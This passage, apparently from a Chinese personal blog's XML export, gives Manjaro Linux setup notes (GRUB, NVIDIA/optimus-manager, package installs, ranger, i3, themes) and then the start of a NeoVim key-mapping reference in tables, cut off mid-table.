class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet acpi_osi=! acpi_osi=’Windows 2009’ resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新grub文件，使永久有效</span></span><br><span class="line">sudo update-grub</span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装性能测试软件</span></span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br><span class="line"><span class="comment">#测试集显性能</span></span><br><span class="line">glxgears</span><br><span class="line">glmark2</span><br><span class="line"><span class="comment">#测试独显性能</span></span><br><span class="line">optirun glxgears</span><br><span class="line">optirun glmark2</span><br><span class="line"><span class="comment">#NVIDIA setting面板打不开使用以下命令</span></span><br><span class="line">optirun -b none nvidia-settings -c :8</span><br></pre></td></tr></table></figure>
<p><strong>使用optimus-manager管理显卡</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S optimus-manager</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">optimus-manager [选项]</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line">  -v, --version         打印版本并退出</span><br><span class="line">  --print-mode          打印当前桌面会话正在运行的GPU模式</span><br><span class="line">  --print-next-mode     打印将在下次登录会话时使用的GPU模式</span><br><span class="line">  --print-startup       打印将在启动时使用的GPU模式</span><br><span class="line">  --switch MODE         将GPU模式设置为MODE。 您需要注销然后登录才能应用更改。</span><br><span class="line">  						可能的模式：intel，nvidia，auto（检查当前模式并切换到另一个）</span><br><span class="line">  --set-startup STARTUP_MODE</span><br><span class="line">                        将启动模式设置为STARTUP_MODE。</span><br><span class="line">                        可能的模式：intel，nvidia，nvidia_once（从Nvidia开始，并在下次启动时恢复到Intel）</span><br><span class="line">  --no-confirm          切换GPU时不要求确认并跳过所有警告</span><br><span class="line">  --cleanup             删除守护程序遗留的自动生成的配置文件</span><br></pre></td></tr></table></figure>
<h3 id="文件管理器"><a href="#文件管理器" class="headerlink" title="文件管理器"></a>文件管理器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ranger</span><br><span class="line">xdg-mime query default inode/directory	<span class="comment">#查看默认文件管理器</span></span><br><span class="line">xdg-mime default  org.gnome.Nautilus.desktop inode/directory <span class="comment">#修改默认文件管理器</span></span><br><span class="line"><span class="comment">#ranger.desktop		ranger文件管理器</span></span><br><span class="line"><span class="comment">#org.gnome.Nautilus.desktop		gnome文件管理器</span></span><br><span class="line">sudo pacman -S w3m	<span class="comment">#安装预览图片的支持库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成配置</span></span><br><span class="line">ranger --copy-config=all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ~/.config/ranger/ 下生成一系列配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用文件预览功能，需配置 rc.conf</span></span><br><span class="line"><span class="comment"># “set use_preview_script” 一行，值设为“true”。启用scope.sh脚本，用于各种文件的预览</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># “set preview_script”一行，值设为“~/.config/ranger/scope.sh”，为预览功能指定脚本文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># “set preview_images”一行，值设为“true”，用对图片的预览功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># “set preview_images_method”一行，值设为“w3m”，用w3m作为图片预览的工具</span></span><br><span class="line"></span><br><span class="line">在使用w3m的中出现缺少 w3mimgdisplay 时安装 w3m-img</span><br></pre></td></tr></table></figure>
<p><a href="https://www.dazhuanlan.com/2020/03/25/5e7a39293a8b7/?__cf_chl_jschl_tk__=82a2c70dc8a3cc361499a0824268e12fe7525522-1600529579-0-AfAKSZbmuEDLQLxUolVbojJS83b9aOlh5-jWq0NVXU4zOSmzZiNuwqprRaoNDdGKG471E8hmiLUrxNmJ_y5SdXLzKypWHw5Z60bbWFPZf7Q6DWFu2Jq26yJO1Jqe5Glu1WLq6AZdEYsmgBqh4NW2Ntjm7GbGZS7jpushXhGalTuXjfdoGD2j8Ph0v_kqNqM8aBVSIt0uAT_7G_SUpy2uTRlVT22adVTv8uLpB1B4Dgg20rzgYTnASSOeA933B2XGFdAWCH5aIe1GWZ8t1K95A1M5cpZI5jccFeoLSPxE0ZPdRTgBZcci1Oawo-I3aYiiiQ">Linux命令行文件管理器Ranger</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Ranger_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">ranger (简体中文) archwiki</a>)</p>
<p>从终端中打开当前文件夹的文件管理器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nautilus .   # gnome桌面文件管理</span><br><span class="line">thunar .     # xfce桌面文件管理</span><br></pre></td></tr></table></figure>
<h3 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S net-tools	<span class="comment">#ifconfig等</span></span><br></pre></td></tr></table></figure>
<h3 id="Nautilus扩展"><a href="#Nautilus扩展" class="headerlink" title="Nautilus扩展"></a>Nautilus扩展</h3><p>Nautilus（鹦鹉螺）是GNOME桌面文件浏览器</p>
<p>Nautilus的Python绑定，允许Nautilus属性页和菜单项扩展用Python编写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S python-nautilus</span><br></pre></td></tr></table></figure>
<h3 id="截图工具"><a href="#截图工具" class="headerlink" title="截图工具"></a>截图工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S flameshot</span><br><span class="line"><span class="comment">#添加快捷键的命令 ： flameshot gui</span></span><br></pre></td></tr></table></figure>
<h3 id="系统信息工具"><a href="#系统信息工具" class="headerlink" title="系统信息工具"></a>系统信息工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S neofetch</span><br><span class="line">sudo pacman -S screenfetch</span><br></pre></td></tr></table></figure>
<h3 id="主题修改工具"><a href="#主题修改工具" class="headerlink" title="主题修改工具"></a>主题修改工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S lxappearance</span><br></pre></td></tr></table></figure>
<h3 id="桌面"><a href="#桌面" class="headerlink" title="桌面"></a>桌面</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S feh</span><br></pre></td></tr></table></figure>
<h3 id="壁纸管理器结合feh用"><a href="#壁纸管理器结合feh用" class="headerlink" title="壁纸管理器结合feh用"></a>壁纸管理器结合feh用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S variety</span><br></pre></td></tr></table></figure>
<h3 id="渲染器"><a href="#渲染器" class="headerlink" title="渲染器"></a>渲染器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S compton</span><br></pre></td></tr></table></figure>
<h3 id="视屏剪辑"><a href="#视屏剪辑" class="headerlink" title="视屏剪辑"></a>视屏剪辑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S kdenlive</span><br></pre></td></tr></table></figure>
<h3 id="修图"><a href="#修图" class="headerlink" title="修图"></a>修图</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gimp</span><br></pre></td></tr></table></figure>
<h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S thunderbird</span><br></pre></td></tr></table></figure>
<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S smplayer</span><br><span class="line">sudo pacman -S smplayer-themes <span class="comment">#安装主题,首选项-&gt;界面-&gt;图标集 推荐Papirus</span></span><br></pre></td></tr></table></figure>
<h3 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S uget aria2	<span class="comment">#打开uget编辑&gt;设置&gt;插件选择aria2</span></span><br><span class="line">sudo pacman -S transmission-gtk <span class="comment"># 或 transmission-qt transmission-cli</span></span><br><span class="line"></span><br><span class="line">yay qbittorrent-enhanced-git</span><br><span class="line">yay motrix</span><br><span class="line">yay xdman</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/XIU2/TrackersListCollection/blob/master/README-ZH.md"><code>BT Tracker</code> 加速配置</a></p>
<h3 id="dock栏"><a href="#dock栏" class="headerlink" title="dock栏"></a>dock栏</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S plank</span><br></pre></td></tr></table></figure>
<p>配置开机启动：<br>优化<code>---&gt;</code>开机启动程序<code>---&gt;</code>添加即可</p>
<h3 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h3><h4 id="ss-UI"><a href="#ss-UI" class="headerlink" title="ss UI"></a>ss UI</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay shadowsocks-qt5</span><br></pre></td></tr></table></figure>
<h4 id="V2Ray-UI"><a href="#V2Ray-UI" class="headerlink" title="V2Ray UI"></a>V2Ray UI</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S qv2ray</span><br></pre></td></tr></table></figure>
<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p><code>www.gnome-look.org</code>  ; <code>www.opendesktop.org</code></p>
<p>可通过<a href="https://www.opendesktop.org/p/1136805/">ocs-url</a>或<a href="https://www.opendesktop.org/p/1175480/">ocs-store</a>来安装主题</p>
<p>或将图标文件放到<code>~/.local/share/icons</code>;主题放在<code>~/.themes</code>；光标放在<code>~/.icons</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#主题包安装，选一个喜欢的即可</span></span><br><span class="line">sudo pacman -S flat-remix-git</span><br><span class="line">yay sweet-theme-git</span><br><span class="line">sudo pacman vimix-gtk-themes-git</span><br><span class="line"><span class="comment">#主题	：Flat-Remix-GTK-Blue-Darkest-NoBorder,Sweet-Dark</span></span><br><span class="line"><span class="comment">#shell(系统交互界面)：Flat-Remix-Darkest-fullPanel</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#图标</span></span><br><span class="line">sudo pacman -S tela-icon-theme-git	<span class="comment">#Tela-manjaro-dark</span></span><br><span class="line"><span class="comment">#光标</span></span><br><span class="line"><span class="comment">#Pulse Glass ， Bibata ， DasBlack ， Capitaine Cursors </span></span><br></pre></td></tr></table></figure>
<h3 id="配置编辑工具-理解为-Linux-的注册表"><a href="#配置编辑工具-理解为-Linux-的注册表" class="headerlink" title="配置编辑工具(理解为 Linux 的注册表)"></a>配置编辑工具(理解为 Linux 的注册表)</h3><p>Gconf Editor是一个配置编辑软件，它允许用户修改桌面环境和应用程序的相关参数值，实现改变桌面环境显示和应用程序属性。例如修改菜单按钮的图标，窗口关闭按钮的左右位置，登录界面背景等</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gconf-editor</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="软件包管理工具使用"><a href="#软件包管理工具使用" class="headerlink" title="软件包管理工具使用"></a>软件包管理工具使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S		<span class="comment">#安装软件</span></span><br><span class="line">sudo pacman -Ss		<span class="comment">#搜索软件相关包</span></span><br><span class="line">sudo pacman -Sy		<span class="comment">#同步软件包数据库</span></span><br><span class="line">sudo pacman -Syy	<span class="comment">#强制同步软件包数据库</span></span><br><span class="line">sudo pacman -Su		<span class="comment">#更新软件、系统</span></span><br><span class="line">sudo pacman -Sc		<span class="comment">#删除下载的包</span></span><br><span class="line">sudo pacman -Scc	<span class="comment">#删除下载的包和数据库</span></span><br><span class="line"></span><br><span class="line">sudo pacman -Q		<span class="comment">#查看安装的软件</span></span><br><span class="line">sudo pacman -Qi		<span class="comment">#查看安装的软件的详细信息</span></span><br><span class="line">sudo pacman -Qo		<span class="comment">#查找文件属于哪个包</span></span><br><span class="line">sudo pacman -Qdtq	<span class="comment">#列出不再被依赖的包，并不显示版本号</span></span><br><span class="line"></span><br><span class="line">sudo pacman -R		<span class="comment">#删除软件</span></span><br><span class="line">sudo pacman -Rsc	<span class="comment">#删除软件及其依赖包</span></span><br></pre></td></tr></table></figure>
<h3 id="捕捉键盘英文输入，中文输入法会不兼容"><a href="#捕捉键盘英文输入，中文输入法会不兼容" class="headerlink" title="捕捉键盘英文输入，中文输入法会不兼容"></a>捕捉键盘英文输入，中文输入法会不兼容</h3><p>screenkey</p>
<h3 id="桌面-1"><a href="#桌面-1" class="headerlink" title="桌面"></a>桌面</h3><h4 id="i3wm"><a href="#i3wm" class="headerlink" title="i3wm"></a>i3wm</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S i3-gaps</span><br></pre></td></tr></table></figure>
<p><strong>i3上方的蓝色框</strong></p>
<p>编辑配置文件，添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">new_window 1pixel</span><br></pre></td></tr></table></figure>
<p><strong>i3边框</strong></p>
<p>需要 i3-gaps 版本的i3</p>
<p>编辑配置文件，在末尾添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gaps inner 15</span><br></pre></td></tr></table></figure>
<p>Super+p 刷新i3配置</p>
<p><strong>快速启动软件的工具</strong></p>
<p>dmenu</p>
<p>Super+s打开</p>
<p><strong>启动i3时启动软件</strong></p>
<p>在配置文件中加入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exec_always 软件名或脚本</span><br></pre></td></tr></table></figure>
<h4 id="deepin桌面"><a href="#deepin桌面" class="headerlink" title="deepin桌面"></a>deepin桌面</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S deepin deepin-extra</span><br><span class="line">sudo pacman -S adobe-source-han-sans-cn-fonts	<span class="comment">##安装思源黑体字库</span></span><br><span class="line"><span class="comment">#思源宋体：adobe-source-han-serif-cn-fonts</span></span><br><span class="line"><span class="comment">#Noto字体：noto-fonts-cjk</span></span><br><span class="line"><span class="comment">#Meslo字体：yay ttf-meslo</span></span><br><span class="line"><span class="comment">#hack字体：ttf-hack</span></span><br></pre></td></tr></table></figure>
<h3 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># fish</span></span><br><span class="line"><span class="built_in">alias</span> cl clear		<span class="comment"># 自定义命令</span></span><br><span class="line">funcave	c			<span class="comment"># 保存自定义</span></span><br><span class="line"><span class="built_in">alias</span> mv <span class="string">&#x27;mv -i&#x27;</span>	<span class="comment"># 若有同名文件提示是否覆盖</span></span><br><span class="line">funcave	mv</span><br><span class="line"></span><br><span class="line"><span class="comment"># zsh</span></span><br><span class="line">vim ~/.zshrc 		<span class="comment"># 添加内容</span></span><br><span class="line"><span class="built_in">alias</span> cl=<span class="string">&quot;clear&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc 	<span class="comment"># 刷新环境变量</span></span><br></pre></td></tr></table></figure>
<h3 id="wine卸载软件"><a href="#wine卸载软件" class="headerlink" title="wine卸载软件"></a>wine卸载软件</h3><p><strong>直接删除软件目录下的文件即可</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~/.wine/drive_c/Program\ Files\ \(x86\)</span><br><span class="line">~/.wine/drive_c/Program\ Files</span><br><span class="line">~/.<span class="built_in">local</span>/share/applications/wine/Programs</span><br><span class="line">~/.config/menus/applications-merged</span><br></pre></td></tr></table></figure>
<p><strong>使用命令卸载</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ....	<span class="comment">#进入软件目录</span></span><br><span class="line">wine uninstall.exe</span><br><span class="line"><span class="comment">#或直接卸载</span></span><br><span class="line">wine uninstall 软件名</span><br></pre></td></tr></table></figure>
<p>卸载后软件图标还在dash中，可到<code>~/Desktop</code>目录下将对应的图标删除</p>
<h3 id="linux有趣命令"><a href="#linux有趣命令" class="headerlink" title="linux有趣命令"></a>linux有趣命令</h3><p><a href="https://zhuanlan.zhihu.com/p/51904179">40个超有趣的Linux命令行彩蛋和游戏</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/weixin_43968923/article/details/86662256">Manjaro 常用软件安装</a></p>
<p><a href="https://blog.csdn.net/was172/article/details/82826607">Manjaro常用软件和命令行推荐</a></p>
<p><a href="https://echoxujh.github.io/2018-07-01-manjaro%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0--%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8%E6%9B%B4%E6%96%B0%E5%AF%BC%E8%87%B4%E8%BF%9B%E4%B8%8D%E4%BA%86%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2.html">manjaro折腾笔记—显卡驱动更新导致进不了图形界面</a></p>
<p><a href="https://blog.csdn.net/qq_39828850/article/details/87919188">Manjaro NVIDIA驱动问题的解决方案</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>NeoVim键盘隐射</title>
    <url>/2020/03/17/NeoVim%E9%94%AE%E7%9B%98%E9%9A%90%E5%B0%84/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                              _ ____</span><br><span class="line">  ___  ___  _ __  _   _ _ __ ( ) ___|</span><br><span class="line"> / _ \/ _ \| <span class="string">&#x27;_ \| | | | &#x27;</span>_ \|/\___ \</span><br><span class="line">|  __/ (_) | | | | |_| | | | |  ___) |</span><br><span class="line"> \___|\___/|_| |_|\__,_|_| |_| |____/</span><br><span class="line"></span><br><span class="line"> _   ___     ___           __  __</span><br><span class="line">| \ | \ \   / (_)_ __ ___ |  \/  | __ _ _ __</span><br><span class="line">|  \| |\ \ / /| | <span class="string">&#x27;_ ` _ \| |\/| |/ _` | &#x27;</span>_ \</span><br><span class="line">| |\  | \ V / | | | | | | | |  | | (_| | |_) |</span><br><span class="line">|_| \_|  \_/  |_|_| |_| |_|_|  |_|\__,_| .__/</span><br><span class="line">                                       |_|</span><br><span class="line"></span><br><span class="line">==============木He寸&amp;eonun===================</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="普通视图"><a href="#普通视图" class="headerlink" title="普通视图"></a>普通视图</h1><h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>J</code></td>
<td style="text-align:left"><code>5j</code></td>
<td style="text-align:left">下5</td>
</tr>
<tr>
<td style="text-align:left"><code>K</code></td>
<td style="text-align:left"><code>5k</code></td>
<td style="text-align:left">上5</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;&lt;CR&gt;</code></td>
<td style="text-align:left"><code>:nohlsearch&lt;CR&gt;</code></td>
<td style="text-align:left">快捷取消搜索高亮</td>
</tr>
<tr>
<td style="text-align:left"><code>MR</code></td>
<td style="text-align:left"><code>:w $MYVIMRC&lt;CR&gt;</code></td>
<td style="text-align:left">打开vimrc</td>
</tr>
<tr>
<td style="text-align:left"><code>s</code></td>
<td style="text-align:left"><code>&lt;nop&gt;</code></td>
<td style="text-align:left">空</td>
</tr>
<tr>
<td style="text-align:left"><code>S</code></td>
<td style="text-align:left"><code>:w&lt;CR&gt;</code></td>
<td style="text-align:left">保存</td>
</tr>
<tr>
<td style="text-align:left"><code>Q</code></td>
<td style="text-align:left"><code>:q&lt;CR&gt;</code></td>
<td style="text-align:left">退出</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>:w !xclip -i -sel c &lt;CR&gt;</code></td>
<td style="text-align:left">选中行复制到系统剪切板（需安装xclip）</td>
</tr>
<tr>
<td style="text-align:left"><code>Y</code></td>
<td style="text-align:left"><code>&quot;+y</code></td>
<td style="text-align:left">复制到系统剪切板（安装gvim）</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+A</code></td>
<td style="text-align:left"><code>&lt;silent&gt; &lt;C-a&gt; ggvG</code></td>
<td style="text-align:left">全选</td>
</tr>
</tbody>
</table>
</div>
<h2 id="分屏"><a href="#分屏" class="headerlink" title="分屏"></a>分屏</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;s</code></td>
<td style="text-align:left"><code>:e&lt;Space&gt;</code></td>
<td style="text-align:left">打开新文件，需补全路径</td>
</tr>
<tr>
<td style="text-align:left"><code>sk</code></td>
<td style="text-align:left"><code>:set splitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">上分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sj</code></td>
<td style="text-align:left"><code>:set nosplitbelow&lt;CR&gt;:split&lt;CR&gt;</code></td>
<td style="text-align:left">下分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sh</code></td>
<td style="text-align:left"><code>:set splitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">左分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sl</code></td>
<td style="text-align:left"><code>:set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt;</code></td>
<td style="text-align:left">右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>sz</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;H</code></td>
<td style="text-align:left">竖向分屏换左右分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>ss</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;t&lt;C-w&gt;K</code></td>
<td style="text-align:left">左右分屏换竖向分屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;k</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;k</code></td>
<td style="text-align:left">光标到上屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;j</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;j</code></td>
<td style="text-align:left">光标到下屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;h</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;h</code></td>
<td style="text-align:left">光标到左屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>&lt;C-w&gt;l</code></td>
<td style="text-align:left">光标到右屏</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;up&gt;</code></td>
<td style="text-align:left"><code>:res +5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线上移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;down&gt;</code></td>
<td style="text-align:left"><code>:res -5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线下移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;left&gt;</code></td>
<td style="text-align:left"><code>:vertical resize+5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线左移</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;right&gt;</code></td>
<td style="text-align:left"><code>:vertical resize-5&lt;CR&gt;</code></td>
<td style="text-align:left">分屏线右移</td>
</tr>
</tbody>
</table>
</div>
<h2 id="选项卡"><a href="#选项卡" class="headerlink" title="选项卡"></a>选项卡</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>tn</code></td>
<td style="text-align:left"><code>:tabe&lt;CR&gt;</code></td>
<td style="text-align:left">打开新选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>th</code></td>
<td style="text-align:left"><code>:-tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到左边的选项卡</td>
</tr>
<tr>
<td style="text-align:left"><code>tl</code></td>
<td style="text-align:left"><code>:+tabnext&lt;CR&gt;</code></td>
<td style="text-align:left">到右边的选项卡</td>
</tr>
</tbody>
</table>
</div>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c1</code></td>
<td style="text-align:left"><code>:set background=dark&lt;CR&gt;:colorscheme solarized8&lt;CR&gt;:AirlineTheme jellybeans&lt;CR&gt;</code></td>
<td style="text-align:left">配色1</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;c2</code></td>
<td style="text-align:left"><code>:set background=light&lt;CR&gt;:let ayucolor=&#39;light&#39;&lt;CR&gt;:colorscheme ayu&lt;CR&gt;:AirlineTheme ayu_light&lt;CR&gt;</code></td>
<td style="text-align:left">配色2</td>
</tr>
</tbody>
</table>
</div>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">按键</th>
<th style="text-align:left">映射键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>F3</code></td>
<td style="text-align:left"><code>:NERDTreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">设置目录树快捷键</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+p</code></td>
<td style="text-align:left"><code>map &lt;C-p&gt; :CtrlP&lt;CR&gt;</code></td>
<td style="text-align:left">打开项目文件浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+d</code></td>
<td style="text-align:left"><code>:set cmdheight=2&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>Ctrl+t</code></td>
<td style="text-align:left"><code>:set cmdheight=10&lt;CR&gt;</code></td>
<td style="text-align:left">修改命令行行数</td>
</tr>
<tr>
<td style="text-align:left"><code>TAB</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">补全</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;l</code></td>
<td style="text-align:left"><code>:UndotreeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">文件历史</td>
</tr>
<tr>
<td style="text-align:left"><code>F8</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreview</code></td>
<td style="text-align:left">浏览Markdown</td>
</tr>
<tr>
<td style="text-align:left"><code>F9</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewStop</code></td>
<td style="text-align:left">关闭Markdown浏览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;mt</code></td>
<td style="text-align:left"><code>&lt;Plug&gt;MarkdownPreviewToggle</code></td>
<td style="text-align:left">开关Markdown预览</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;tm</code></td>
<td style="text-align:left"><code>:TableModeToggle&lt;CR&gt;</code></td>
<td style="text-align:left">制表工具</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;cn</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">注释所选行</td>
</tr>
<tr>
<td style="text-align:left"><code>&lt;LEADER&gt;cu</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">取消所选行注释</td>
</tr>
<tr>
<td style="text-align:left"><code>cs&quot;&#39;</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">替换<code>&quot;</code>为<code>‘</code>（其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>ds&quot;</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">删除<code>&quot;</code> （其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>ysiw]</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">给单词加<code>]</code> （其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>yss)</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">给整行加<code>)</code> （其他类推,html标签为<code>t</code>）</td>
</tr>
<tr>
<td style="text-align:left"><code>ysiw&lt;em&gt;</code></td>
<td style="text-align:left"></td>
<td style="text-align:left">给单词加<code>&lt;em&gt;&lt;/em&gt;</code>（其他类推）</td>
</tr>
</tbody>
</table>
</div>
<h2 id="vim默认快捷键"><a href="#vim默认快捷键" class="headerlink" title="vim默认快捷键"></a>vim默认快捷键</h2><h3 id="控制光标"><a href="#控制光标" class="headerlink" title="控制光标"></a>控制光标</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">快捷键</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>h</code></td>
<td style="text-align:left">光标向左移动一个字符</td>
</tr>
<tr>
<td style="text-align:left"><code>j</code> 或 <code>Ctrl + J</code></td>
